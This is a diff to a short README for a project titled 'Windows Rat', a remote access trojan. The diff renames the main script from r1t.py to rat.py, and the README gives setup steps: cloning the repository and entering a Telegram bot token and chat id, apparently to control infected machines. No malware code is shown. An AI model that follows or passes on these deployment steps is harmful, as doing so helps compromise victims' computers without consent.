@@ -1,5 +1,5 @@
 # Windows Rat
-main file : r1t.py
+main file : rat.py
 
 libraries file : requirements.txt
 
@@ -12,7 +12,7 @@ pkg install git -y
 pkg install nano -y
 git clone https://github.com/DarkNetTelegramBot/win_r1t
 cd win_r1t
-nano r1t.py
+nano rat.py
 ```
 + in line 2 set your telegram token bot
 + in line 4 set your account chat id
